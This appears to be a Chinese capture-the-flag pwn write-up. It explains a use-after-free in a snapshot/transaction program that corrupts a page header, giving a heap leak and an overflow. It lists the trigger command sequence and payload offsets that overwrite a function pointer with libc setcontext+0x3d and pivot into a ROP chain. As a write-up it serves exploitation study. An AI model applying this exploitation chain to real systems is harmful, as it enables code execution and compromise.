

## 程序结构

命令解析后有两组关键功能：

- `LOAD SNAPSHOT OPEN`：分配 `SnapshotPage` 和 `SnapshotRoute`。
- `DUMP SNAPSHOT`：通过 route 中的函数指针导出 snapshot。

IDA 中 `LOAD` 处理函数在 `sub_F810`，`DUMP` 处理函数在 `sub_10540`。

`LOAD SNAPSHOT OPEN` 的核心初始化如下：

```c
page = new(0x800);
page->len = 0;
page->hash = 0;
page->magic = 1;
page->capacity = 0x7e0;
memset(page + 0x20, 0, 0x7e0);

route = new(0x780);
route->sink = snapshot_hex_sink;  // route + 0x40
route->file = stdout;             // route + 0x48
```

`DUMP SNAPSHOT` 则是：

```c
size = min(page->len, 0x1000);
route->sink(page + 0x20, size, route->file);
```

默认的 `snapshot_hex_sink` 是 `sub_41DB0`，只负责把内存转成 hex 打印。

## 漏洞

漏洞不在 `LOAD SNAPSHOT DATA` 本身：追加数据前会检查 `page->len + input_len <= page->capacity`。

真正的问题在事务系统。大量嵌套 `BEGIN` 后，事务容器发生扩容；随后 `COMMIT` 弹出事务层时，内部仍保留了指向已释放事务缓冲区的引用。之后 `LOAD SNAPSHOT OPEN` 会把这个释放块复用成 `SnapshotPage`。再执行一次 `BEGIN` 时，事务逻辑会通过悬挂引用写入这块内存，于是正在使用的 `SnapshotPage` header 被破坏。

利用效果有两个：

- `page->len` 被污染成大值，`DUMP SNAPSHOT` 会从 `page + 0x20` 向后泄漏最多 `0x1000` 字节。
- `page->capacity` 也被污染；后续 `LOAD SNAPSHOT CLEAR` 只清 `len/hash`，不会恢复 `capacity`，因此可以合法地向 page 写入超过原始 `0x7e0` 的数据，形成越界写。

触发序列：

```text
CONFIG LOG ERROR
BEGIN * 55
COMMIT
LOAD SNAPSHOT OPEN
BEGIN
DUMP SNAPSHOT
```
## 信息泄漏

泄漏的起点是 `page + 0x20`，长度可达 `0x1000`。`SnapshotPage` 大小为 `0x800`，而 `SnapshotRoute` 在 `OPEN` 中紧跟着分配，因此越界读会读到 route。

## 控制流劫持

第一次泄漏后执行：

```text
LOAD SNAPSHOT CLEAR
LOAD SNAPSHOT DATA <payload>
DUMP SNAPSHOT
```

`CLEAR` 只清零 `page->len/hash`，保留被污染的大 `capacity`。因此可以写入 `0x900` 字节 payload，越过 `SnapshotPage` 覆盖紧邻的 `SnapshotRoute`：

```python
payload[0x830:0x838] = p64(libc + setcontext_plus_0x3d)
payload[0x838:0x840] = p64(data)
```

再次 `DUMP SNAPSHOT` 时，程序执行：

```c
route->sink(page + 0x20, size, route->file);
```

此时等价于调用：

```c
setcontext_plus_0x3d(page + 0x20, size, data);
```
在 `page->data` 中伪造 context：

```python
payload[0xa0:0xa8] = p64(data + rop_off)
payload[0xa8:0xb0] = p64(pop_rdi)
```

`ret` 后进入布置在 `data + rop_off` 的 ROP 链。
